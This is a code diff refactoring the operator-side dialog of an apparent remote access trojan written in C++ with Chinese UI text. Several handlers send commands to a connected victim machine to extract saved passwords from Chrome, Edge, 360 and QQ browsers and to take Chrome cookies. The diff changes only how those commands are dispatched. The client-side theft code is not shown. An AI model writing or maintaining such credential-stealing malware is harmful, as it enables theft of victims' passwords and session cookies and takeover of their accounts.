@@ -41,7 +41,7 @@ BOOL DecryptDlg::OnInitDialog() {
 	SetWindowText(str);
 
 	BYTE bToken = COMMAND_NEXT;
-	m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+	m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 	m_EditDecrypedResult.SetWindowTextA(CString("<<< 提示: 请在菜单选择解密类型 >>>\r\n"));
 	int m_nCurSel = m_EditDecrypedResult.GetWindowTextLengthA();
 	m_EditDecrypedResult.SetSel((int)m_nCurSel, (int)m_nCurSel);
@@ -82,40 +82,40 @@ void DecryptDlg::OnSize(UINT nType, int cx, int cy)
 void DecryptDlg::OnDecryptChrome()
 {
 	BYTE	bToken[32] = { COMMAND_LLQ_GetChromePassWord };
-	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+	m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 
 void DecryptDlg::OnDecryptEdge()
 {
 	BYTE	bToken[32] = { COMMAND_LLQ_GetEdgePassWord };
-	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+	m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 
 void DecryptDlg::OnDecryptSpeed360()
 {
 	BYTE	bToken[32] = { COMMAND_LLQ_GetSpeed360PassWord };
-	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+	m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 
 void DecryptDlg::OnDecrypt360()
 {
 	BYTE	bToken[32] = { COMMAND_LLQ_Get360sePassWord };
-	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+	m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 
 void DecryptDlg::OnDecryptQQ()
 {
 	BYTE	bToken[32] = { COMMAND_LLQ_GetQQBroPassWord };
-	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+	m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 
 void DecryptDlg::OnDecryptChromeCookies()
 {
 	BYTE	bToken[32] = { COMMAND_LLQ_GetChromeCookies };
-	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+	m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
